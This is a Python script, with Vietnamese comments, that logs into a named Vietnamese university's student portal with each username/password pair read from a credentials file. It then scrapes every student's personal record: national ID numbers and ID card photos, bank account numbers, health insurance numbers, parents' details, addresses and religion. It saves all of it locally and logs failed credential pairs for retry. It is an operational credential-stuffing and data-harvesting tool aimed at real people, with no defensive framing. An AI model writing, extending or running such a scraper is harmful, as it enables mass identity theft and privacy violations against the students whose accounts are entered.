import requests
from bs4 import BeautifulSoup
import os
import time
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from http.client import IncompleteRead

# Khởi tạo session với retry logic
def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=2, status_forcelist=[429, 500, 502, 503, 504])
    session.mount("https://", HTTPAdapter(max_retries=retries))
    return session

session = create_session()

headers_common = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://sinhvien.ufl.udn.vn/DangNhap/Login",
    "Origin": "https://sinhvien.ufl.udn.vn",
}

def sanitize_filename(name):
    """Sanitize a string to be safe for file paths."""
    if not name or not isinstance(name, str):
        return "Unknown_Student"
    name = re.sub(r'[<>:"/\\|?*]', '_', name)
    name = re.sub(r'_+', '_', name.strip())
    return name or "Unknown_Student"

def download_image(session, image_url, save_path, headers):
    """Download an image from a URL and save it to the specified path."""
    if not image_url or image_url.strip() == "":
        print(f"[-] Không có URL ảnh để tải: {save_path}")
        return False
    
    try:
        # Ensure the image URL is absolute
        if not image_url.startswith("http"):
            image_url = f"https://sinhvien.ufl.udn.vn{image_url}"
        
        # Download the image
        response = session.get(image_url, headers=headers, timeout=15, stream=True)
        if response.status_code != 200:
            print(f"[-] Tải ảnh thất bại (Status: {response.status_code}): {save_path}")
            return False

        # Save the image
        with open(save_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        print(f"[+] Đã lưu ảnh vào {save_path}")
        return True
    
    except Exception as e:
        print(f"[-] Lỗi khi tải ảnh từ {image_url}: {str(e)}")
        return False

def get_input_value(soup, input_id):
    try:
        el = soup.find("input", {"id": input_id})
        if el:
            return el.get("value", "").strip() or "Thiếu"
        return "Thiếu"
    except Exception as e:
        print(f"[-] Lỗi khi lấy giá trị input {input_id}: {str(e)}")
        return "Thiếu"

def get_checkbox_status(soup, checkbox_id):
    try:
        el = soup.find("input", {"id": checkbox_id, "type": "checkbox"})
        if el and el.has_attr("checked"):
            return "Có"
        return "Không"
    except Exception as e:
        print(f"[-] Lỗi khi kiểm tra checkbox {checkbox_id}: {str(e)}")
        return "Không"

def get_select_value(soup, select_id):
    try:
        el = soup.find("select", {"id": select_id})
        if el:
            selected = el.find("option", selected=True)
            if selected:
                return selected.text.strip()
            return "Thiếu"
        return "Thiếu"
    except Exception as e:
        print(f"[-] Lỗi khi lấy giá trị select {select_id}: {str(e)}")
        return "Thiếu"

def get_value(soup, label):
    try:
        tag = soup.find("span", string=lambda t: t and label in t)
        if tag:
            input_tag = tag.find_next(["input", "select"])
            if input_tag.name == "input":
                return input_tag.get("value", "").strip()
            elif input_tag.name == "select":
                selected = input_tag.find("option", selected=True)
                return selected.text.strip() if selected else ""
        return ""
    except Exception as e:
        print(f"[-] Lỗi khi lấy giá trị cho label {label}: {str(e)}")
        return ""

def process_student(username, password):
    # Thêm độ trễ 3 giây trước mỗi lần đăng nhập để tránh rate limiting
    time.sleep(3)

    # Bước 1: Đăng nhập
    login_url = "https://sinhvien.ufl.udn.vn/DangNhap/SaveToken"
    payload = {
        "Role": "0",
        "UserName": username,
        "Password": password
    }

    try:
        resp_login = session.post(login_url, data=payload, headers=headers_common, timeout=15)
        if not resp_login.ok:
            print(f"[-] Đăng nhập thất bại cho {username} (Status: {resp_login.status_code})")
            return False

        print(f"[+] Đăng nhập thành công cho {username}")

        # Bước 2: Truy cập trang Thông tin sinh viên
        session.get("https://sinhvien.ufl.udn.vn/SinhVien", headers=headers_common, timeout=15)
        content = b""
        chunk_count = 0
        try:
            response_tt = session.get("https://sinhvien.ufl.udn.vn/SinhVien/ThongTinSinhVien", headers=headers_common, timeout=15, stream=True)
            print(f"Debug: Response status = {response_tt.status_code}, Content-Length = {response_tt.headers.get('Content-Length', 'Unknown')}")
            # Đọc response theo chunk
            for chunk in response_tt.iter_content(chunk_size=1024):
                if chunk:
                    content += chunk
                    chunk_count += 1
            response_tt.raw.close()
        except IncompleteRead as e:
            print(f"[-] IncompleteRead error, partial data received: {str(e)}, Chunks received: {chunk_count}")
            print(f"Debug: Partial content size = {len(content)} bytes")
            if content:
                print(f"[!] Attempting to parse partial data for {username}")
            else:
                # Lưu username thất bại để thử lại sau
                with open("failed_usernames.txt", "a", encoding="utf-8") as f:
                    f.write(f"{username}\t{password}\n")
                return False

        # Parse nội dung, kể cả khi có dữ liệu không hoàn chỉnh
        try:
            soup = BeautifulSoup(content.decode('utf-8', errors='ignore'), "html.parser")
        except Exception as e:
            print(f"[-] Lỗi khi parse HTML cho {username}: {str(e)}")
            with open("failed_usernames.txt", "a", encoding="utf-8") as f:
                f.write(f"{username}\t{password}\n")
            return False

        # Dữ liệu cần trích xuất
        data = {
            "Mã sinh viên": get_value(soup, "Mã sinh viên"),
            "Họ và tên": get_value(soup, "Họ và tên"),
            "Ngày sinh": get_value(soup, "Ngày sinh"),
            "Giới tính": get_value(soup, "Giới tính"),
            "Số CCCD": get_value(soup, "Số CCCD"),
            "Nơi cấp CCCD": get_value(soup, "Nơi cấp CCCD"),
            "Ngày cấp CCCD": get_value(soup, "Ngày cấp CCCD"),
            "Quốc tịch": get_value(soup, "Quốc tịch"),
            "Dân tộc": get_value(soup, "Dân tộc"),
            "Tôn giáo": get_value(soup, "Tôn giáo"),
            "Hệ đào tạo": get_value(soup, "Hệ đào tạo"),
            "Chuyên ngành": get_value(soup, "Chuyên ngành"),
            "Khóa học": get_value(soup, "Khóa học"),
            "Khóa tuyển sinh": get_value(soup, "Khóa tuyển sinh"),
            "Số điện thoại chính": get_value(soup, "Số điện thoại chính"),
            "Số điện thoại phụ": get_value(soup, "Số điện thoại phụ"),
            "Email cá nhân": get_value(soup, "Email"),
            "Email sinh viên": get_value(soup, "Email sinh viên"),
            "Đoàn viên": get_value(soup, "Là đoàn viên"),
            "Đảng viên": get_value(soup, "Là Đảng viên"),
            "Ngày vào Đoàn": get_value(soup, "Ngày vào Đoàn/Đảng"),
            "Học lực lớp 12": get_value(soup, "Học lực lớp 12"),
            "Hạnh kiểm lớp 12": get_value(soup, "Hạnh kiểm lớp 12"),
        }

        # THÔNG TIN QUAN HỆ GIA ĐÌNH
        family_info = {
            "--- Thông tin bố ---": "",
            "👤 Họ tên bố": get_input_value(soup, "Ho_ten_cha"),
            "📞 SĐT bố": get_input_value(soup, "SDTBo"),
            "🎂 Năm sinh bố": get_input_value(soup, "Namsinh_cha"),
            "💼 Nghề nghiệp bố": get_input_value(soup, "Hoat_dong_XH_CT_cha"),
            "☠️ Mồ côi bố": get_checkbox_status(soup, "MoCoiCha"),
            "--- Thông tin mẹ ---": "",
            "👩 Họ tên mẹ": get_input_value(soup, "Ho_ten_me"),
            "📞 SĐT mẹ": get_input_value(soup, "SDTMe"),
            "🎂 Năm sinh mẹ": get_input_value(soup, "Namsinh_me"),
            "💼 Nghề nghiệp mẹ": get_input_value(soup, "Hoat_dong_XH_CT_me"),
            "☠️ Mồ côi mẹ": get_checkbox_status(soup, "MoCoiMe"),
            "--- Người giám hộ (nếu có) ---": "",
            "👤 Họ tên người giám hộ": get_input_value(soup, "Ho_ten_vo_chong"),
            "📞 SĐT người giám hộ": get_input_value(soup, "SDTVoChong"),
            "🎂 Năm sinh người giám hộ": get_input_value(soup, "Namsinh_VoChong"),
            "💼 Nghề nghiệp người giám hộ": get_input_value(soup, "Hoat_dong_XH_CT_vo_chong"),
        }

        # Địa chỉ thường trú
        fields = {
            "🏠 Tỉnh/Thành phố thường trú": get_select_value(soup, "cbbTinhThanhPhoEdit"),
            "🏠 Quận/Huyện thường trú": get_select_value(soup, "ID_huyen_tt_sv"),
            "🏠 Xã/Phường thường trú": get_select_value(soup, "cbbXaTT"),
            "🏠 Số nhà/thôn, xóm thường trú": get_input_value(soup, "So_nha"),
            "🏡 Tỉnh/Thành phố hiện nay": get_select_value(soup, "ID_tinh_NoiO_hiennay"),
            "🏡 Quận/Huyện hiện nay": get_select_value(soup, "ID_huyen_NoiO_hiennay"),
            "🏡 Xã/Phường hiện nay": get_select_value(soup, "ID_xa_NoiO_hiennay"),
            "🏡 Số nhà/thôn, xóm hiện nay": get_input_value(soup, "NoiO_hiennay"),
            "🌍 Tỉnh/TP nơi sinh": get_select_value(soup, "cbbTinhNS"),
            "🏞️ Quận/Huyện nơi sinh": get_select_value(soup, "cbbHuyenNS"),
            "🏞️ Xã/Phường nơi sinh": get_select_value(soup, "cbbXaNS"),
            "🏦 Tên ngân hàng": get_input_value(soup, "Ten_ngan_hang"),
            "💳 Số tài khoản ngân hàng": get_input_value(soup, "So_tai_khoan"),
            "🏠 Tên chủ nhà trọ": get_input_value(soup, "TenChuHo"),
            "📞 SĐT chủ nhà trọ": get_input_value(soup, "SDTChuHo"),
            "📅 Từ ngày thuê trọ": get_input_value(soup, "TuNgayChuHo"),
            "🏫 Ở ký túc xá": get_select_value(soup, "Ky_tuc_xa_noi_tru"),
            "🎓 Học kỳ ở nội/ngoại trú": get_select_value(soup, "cbbhockynoingoaitru")
        }

        # Thông tin khác
        more_info = {
            "Tỉnh thành Lớp 10": get_select_value(soup, "IdTinhLop10"),
            "Mã số bhyt": get_input_value(soup, "Ma_so_bao_hiem"),
        }

        # Ghi ra file
        sanitized_name = sanitize_filename(data['Họ và tên'])
        output_dir = f"data/{sanitized_name}"
        os.makedirs(output_dir, exist_ok=True)
        filename = os.path.join(output_dir, "info.txt")

        with open(filename, "w", encoding="utf-8") as f:
            f.write("### 📄 Thông tin sinh viên\n\n")
            for k in [
                "Mã sinh viên", "Họ và tên", "Ngày sinh", "Giới tính", "Số CCCD", "Nơi cấp CCCD", "Ngày cấp CCCD",
                "Quốc tịch", "Dân tộc", "Tôn giáo", "Hệ đào tạo", "Chuyên ngành", "Khóa học", "Khóa tuyển sinh",
                "Số điện thoại chính", "Số điện thoại phụ", "Email cá nhân", "Email sinh viên",
                "Đoàn viên", "Đảng viên", "Ngày vào Đoàn", "Học lực lớp 12", "Hạnh kiểm lớp 12"
            ]:
                f.write(f"- **{k}**: {data[k]}\n")

            f.write("\n### 🏠 Thông tin thường trú\n\n")
            for label, value in fields.items():
                f.write(f"{label}: {value}\n")
            
            f.write("\n### 🏠 Thông tin gia đình\n\n")
            for label, value in family_info.items():
                f.write(f"{label}: {value}\n")
            
            f.write("\n### 🏠 Thông tin khác\n\n")
            for label, value in more_info.items():
                f.write(f"{label}: {value}\n")
        
        print(f"[+] Đã lưu thông tin sinh viên vào {filename}")

        # Tải ảnh thẻ (Ảnh thẻ)
        image_url_the = ""
        img_tag_the = soup.find("img", {"id": "idfileThe"})
        if img_tag_the and img_tag_the.get("src"):
            image_url_the = img_tag_the.get("src")
        else:
            hidden_input_the = soup.find("input", {"id": "hiImageAnhThe"})
            if hidden_input_the and hidden_input_the.get("value"):
                image_url_the = hidden_input_the.get("value")
        
        if image_url_the:
            image_path_the = os.path.join(output_dir, "anh_the.jpg")
            download_image(session, image_url_the, image_path_the, headers_common)
        else:
            print(f"[-] Không tìm thấy URL ảnh thẻ cho {username}")

        # Tải ảnh CCCD mặt trước (Ảnh CCCD mặt trước)
        image_url_cccd_front = ""
        img_tag_cccd_front = soup.find("img", id="idfileCMND")
        if img_tag_cccd_front and img_tag_cccd_front.get("src"):
            image_url_cccd_front = img_tag_cccd_front.get("src")
        else:
            hidden_input_cccd_front = soup.find("input", {"id": "hiImageAnhCMND"})
            if hidden_input_cccd_front and hidden_input_cccd_front.get("value"):
                image_url_cccd_front = hidden_input_cccd_front.get("value")
        
        if image_url_cccd_front:
            image_path_cccd_front = os.path.join(output_dir, "cccd_mat_truoc.jpg")
            download_image(session, image_url_cccd_front, image_path_cccd_front, headers_common)
        else:
            print(f"[-] Không tìm thấy URL ảnh CCCD mặt trước cho {username}")

        # Tải ảnh CCCD mặt sau (Ảnh CCCD mặt sau)
        image_url_cccd_back = ""
        img_tag_cccd_back = soup.find("img", id="idfileCMNDMatSau")
        if img_tag_cccd_back and img_tag_cccd_back.get("src"):
            image_url_cccd_back = img_tag_cccd_back.get("src")
        else:
            hidden_input_cccd_back = soup.find("input", {"id": "hiImageAnhCMNDMatSau"})
            if hidden_input_cccd_back and hidden_input_cccd_back.get("value"):
                image_url_cccd_back = hidden_input_cccd_back.get("value")
        
        if image_url_cccd_back:
            image_path_cccd_back = os.path.join(output_dir, "cccd_mat_sau.jpg")
            download_image(session, image_url_cccd_back, image_path_cccd_back, headers_common)
        else:
            print(f"[-] Không tìm thấy URL ảnh CCCD mặt sau cho {username}")

        # Thêm độ trễ 2 giây sau khi lưu thành công
        time.sleep(2)
        return True

    except Exception as e:
        print(f"[-] Lỗi khi xử lý cho {username}: {str(e)}")
        # Lưu username thất bại để thử lại sau
        with open("failed_usernames.txt", "a", encoding="utf-8") as f:
            f.write(f"{username}\t{password}\n")
        return False

# Đọc file chứa thông tin đăng nhập
credentials_file = "ufl.txt"
try:
    with open(credentials_file, "r", encoding="utf-8-sig") as f:
        lines = f.readlines()
        for line in lines:
            # Bỏ các dòng trống, comment hoặc header
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("Username"):
                continue
                
            # In dòng thô để debug
            print(f"Debug: Raw line = '{line}'")
            # Tách username và password, hỗ trợ tab hoặc nhiều khoảng trắng
            try:
                parts = re.split(r'\t|\s+', line.strip())
                if len(parts) != 2:
                    print(f"[-] Dòng không hợp lệ (số phần không đúng): {line}")
                    continue
                username, password = parts
                username = username.strip()
                password = password.strip()
                if not username or not password:
                    print(f"[-] Dòng không hợp lệ (thiếu username hoặc password): {line}")
                    continue
                print(f"\nĐang xử lý cho username: {username}")
                if not process_student(username, password):
                    # Reset session sau khi thất bại
                    session = create_session()
            except ValueError as e:
                print(f"[-] Dòng không hợp lệ: {line}, Error: {str(e)}")
                
except FileNotFoundError:
    print(f"[-] Không tìm thấy file {credentials_file}")
except Exception as e:
    print(f"[-] Lỗi khi đọc file: {str(e)}")